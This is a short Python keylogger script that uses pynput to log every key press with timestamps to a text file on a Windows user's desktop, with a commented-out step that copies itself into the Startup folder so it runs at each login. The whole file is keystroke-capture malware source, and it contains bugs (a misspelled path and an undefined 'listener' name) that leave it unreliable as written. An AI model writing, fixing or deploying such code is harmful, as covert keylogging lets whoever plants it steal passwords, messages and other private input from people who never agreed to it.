from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = "jiati"
# username = os.getlogin()
logging_dir = f"C:/User/{username}/Desktop"

# Put it into start
# copyfile('keylogger.py',f"C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/keylogger.py")

logging.basicConfig(filename=f"{logging_dir}/keylog.txt", level=logging.DEBUG,format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with listener(on_press = key_handler) as listener:
    listener.join()